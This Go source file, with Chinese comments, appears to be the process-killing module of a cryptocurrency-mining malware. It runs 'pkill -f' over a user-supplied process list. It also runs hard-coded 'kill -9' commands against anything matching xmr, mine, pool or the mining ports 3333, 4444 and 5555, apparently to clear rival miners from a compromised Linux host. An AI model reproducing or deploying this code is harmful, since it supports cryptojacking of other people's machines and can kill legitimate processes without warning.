package add

import (
	"cpack"
	"os/exec"
	"time"
	"strings"
)

func processk(){
	if cpack.LinuxProcess!= "0" {
		a := strings.Split(cpack.LinuxProcess, ":")
		for i:=0;i<len(a);i++ {
			b :="pkill -f "
			b += a[i]
			cpack.System(b)
		}
	}
}

func minepool(){
	minepool:= []string{}
	minepool=append(minepool,"ps auxf|grep -v grep|grep 3333|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep xmr|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep mine|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep pool|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep 4444|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep 1444|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep 5555|awk '{print $2}'|xargs kill -9")
	minepool=append(minepool,"ps auxf|grep -v grep|grep -p x|awk '{print $2}'|xargs kill -9")
	for i:=0; i<len(minepool);i++ {
		cpack.System(minepool[i])
	}
}
//有可能堵塞.....
//此方法有bug，返回的pid会出现空行，sh的情况下会出现其他数字，临时解决方案是判断是否包含
func Pidtest(a string) (e error,c string){//输入进程名获取pid，第一个参数还回错误，二个还回pid
	b:="pgrep -f "
	b +=a
	cmd := exec.Command("/bin/bash", "-c",b)
	out, err := cmd.Output()
	return err,string(out)
}

func Kill() {
	processk()//用户自定义的k进程
	minepool()//程序自带的k
	//a,b := Pidtest(cpack.Filename)
	/*if a != nil {

	}else {
		Kcpu(b)
	}*/

	time.Sleep(1000)
}
